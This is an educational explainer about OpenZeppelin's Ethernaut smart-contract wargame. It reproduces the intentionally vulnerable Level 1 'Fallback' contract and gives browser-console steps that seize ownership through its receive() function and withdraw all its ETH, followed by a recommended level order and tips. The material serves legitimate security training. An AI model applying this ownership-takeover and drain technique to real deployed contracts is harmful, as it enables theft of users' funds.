# Ethernaut Challenges

## Simple Definition
Ethernaut is a Web3 wargame created by OpenZeppelin where you hack smart contracts to learn about security vulnerabilities. Each level presents a vulnerable contract, and your goal is to exploit it to complete the challenge.

## The Best Analogy
Think of Ethernaut like a **capture-the-flag (CTF) competition for hackers**. Instead of attacking real systems (which is illegal), you attack intentionally vulnerable contracts in a safe environment. Each level teaches you a specific vulnerability, and completing it gives you a "flag" (proof of exploit).

## Getting Started

```text
1. Go to: https://ethernaut.openzeppelin.com
2. Connect your MetaMask wallet (use a test wallet, not your main wallet!)
3. Start with Level 0: Hello Ethernaut
4. Each level provides:
   - A vulnerable contract deployed on a testnet
   - A goal (e.g., "drain the contract's ETH")
   - Hints (if you get stuck)
```

## Example: Level 1 - Fallback

```solidity
// The vulnerable contract (provided by Ethernaut)
contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;
    
    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }
    
    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }
    
    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }
    
    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
    
    // VULNERABILITY: Fallback function allows anyone to become owner
    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

## Solution Steps

```javascript
// In your browser console (with Ethernaut):

// Step 1: Contribute a small amount to have a contribution record
await contract.contribute({ value: toWei('0.0005') });

// Step 2: Send ETH directly to trigger the receive() function
await sendTransaction({
  to: contract.address,
  value: toWei('0.001')
});

// Step 3: Verify you are now the owner
await contract.owner(); // Should return your address

// Step 4: Withdraw all funds
await contract.withdraw();

// Step 5: Submit the level
await submitLevel();
```

## Learning Path (Recommended Order)

```text
Beginner Levels (Learn basics):
1. Fallback - Access control via fallback
2. Fallout - Constructor vulnerabilities
3. Coin Flip - Randomness manipulation
4. Telephone - tx.origin vs msg.sender
5. Token - Integer overflow

Intermediate Levels (Common attacks):
6. Delegation - Delegatecall exploitation
7. Force - Forcing ETH to contracts
8. Vault - Storage privacy
9. King - DoS via failed transfers
10. Re-entrancy - Classic reentrancy attack

Advanced Levels (Complex exploits):
11. Elevator - Interface manipulation
12. Privacy - Storage layout
13. Gatekeeper - Gas and type tricks
14. Gatekeeper Two - Assembly and extcodesize
15. Naught Coin - ERC20 approval tricks
```

## Tips for Success

```text
1. Read the contract carefully - vulnerabilities are often subtle
2. Understand the goal - what exactly do you need to achieve?
3. Use Remix IDE to test your exploit locally first
4. Check the hints if you're stuck (but try to solve it yourself first)
5. Learn from each level - document the vulnerability type
6. Don't rush - understanding is more important than speed
7. Join the community - discuss solutions on Discord/Twitter
```

## Key Takeaways
- **Hands-On Learning:** The best way to learn security is by hacking (legally!).
- **Real Vulnerabilities:** Each level is based on real-world exploits.
- **Safe Environment:** Practice without risking real money.
- **Community:** Large community of learners and security researchers.
- **Certificate:** Completing all levels demonstrates security expertise.
- **Career Boost:** Ethernaut completion is respected in Web3 security jobs.
- **Continuous Practice:** New levels are added periodically.